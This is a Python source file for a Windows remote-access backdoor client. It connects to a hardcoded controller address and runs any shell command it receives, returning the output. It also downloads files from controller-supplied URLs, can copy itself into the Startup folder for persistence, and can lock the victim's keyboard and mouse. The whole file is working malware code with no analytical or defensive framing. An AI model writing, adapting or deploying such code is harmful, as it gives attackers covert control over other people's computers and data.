from shutil import copyfile
import subprocess
import keyboard
import ctypes
import requests
import socket
import os
import sys
import threading
import mouse
import time

key = 'b3DL7F14d0XOYKxjz5yHchslAItZI0jE'
timeout = 60

host = '192.168.1.71'
port = 3142

program_name = 'main.exe'

global mouse_blocking
mouse_blocking = False

keyboard_blocking = False


def connect():
    try:
        print('Connecting...')
        client.connect((host, port))
        client.send(str.encode(key, 'utf-8'))
        print('Successful connected!')
    except socket.error:
        print(f'Connection refused. Reconnect in {timeout} seconds...')
        time.sleep(timeout)
        connect()


def disconnect():
    client.close()
    print('Connection closed')


def send(data):
    client.send(bytes(data + '\n', 'utf-8'))


def run_cmd_command(cmd):
    proc = subprocess.Popen(cmd, shell=True, cwd=get_working_dir(), stdin=subprocess.DEVNULL,
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = proc.communicate()
    proc.wait()

    out_data = stdout.decode('cp866')

    if len(out_data) == 0:
        out_data = stderr.decode('cp866')

    return out_data + 'OK'


def download_file(url, filename):
    r = requests.get(url, allow_redirects=True)
    open(filename, 'wb').write(r.content)
    return 'OK'


def get_working_dir():
    username = os.getlogin()
    return f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\' \
           f'Windows\\Start Menu\\Programs\\Startup'


def add_to_startup():
    working_dir = get_working_dir() + f'\\{program_name}'

    if not os.path.isfile(working_dir):
        copyfile(os.getcwd() + f'\\{program_name}', working_dir)
        print('Program was added to startup')
        subprocess.Popen([working_dir])
        ctypes.windll.user32.MessageBoxW(0, "Success", "Successfully added to startup", 0)
        sys.exit()
    else:
        print('Program have already added in startup')


def block_keyboard():
    for i in range(110):
        keyboard.block_key(i)
    return 'OK'


def unblock_keyboard():
    for i in range(110):
        keyboard.unblock_key(i)
    return 'OK'


def block_mouse():
    # until mouse_blocking is False, move mouse to (1,0)
    global mouse_blocking
    mouse_blocking = True
    while mouse_blocking:
        mouse.move(10000, 10000, absolute=True, duration=0)


def unblock_mouse():
    # stops infinite control of mouse after 10 seconds if program fails to execute
    global mouse_blocking
    mouse_blocking = False


# add_to_startup()

while True:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect()

    while True:
        try:
            msg = client.recv(1024)

            if len(msg) <= 0:
                break

            command = msg.decode('utf-8')

            if command.startswith('cmd'):
                send(run_cmd_command(command[4:]))
            elif command.startswith('download'):
                params = command[9:].split()
                if len(params) == 0:
                    send('Specify the url and then the filename')
                elif len(params) == 1:
                    send('Specify the filename')
                else:
                    send(download_file(params[0], params[1]))
            elif command.startswith('keyboard'):
                if 'unblock' in command:
                    if keyboard_blocking:
                        keyboard_blocking = False
                        send(unblock_keyboard())
                    else:
                        send("Keyboard isn't blocking")
                elif 'block' in command:
                    if keyboard_blocking:
                        send('Keyboard was already blocked')
                    else:
                        keyboard_blocking = True
                        send(block_keyboard())
                else:
                    send('Specify the action')
            elif command.startswith('mouse'):
                if 'unblock' in command:
                    if mouse_blocking:
                        threading.Thread(target=unblock_mouse).start()
                        send('OK')
                    else:
                        send("Mouse isn't blocking")
                elif 'block' in command:
                    if mouse_blocking:
                        send('Mouse was already blocked')
                    else:
                        threading.Thread(target=block_mouse).start()
                        send('OK')
                else:
                    send('Specify the action')
            elif command == 'ping':
                send('pong')
            else:
                send('Unknown command')
        except socket.error as e:
            print(str(e))
            break

    disconnect()
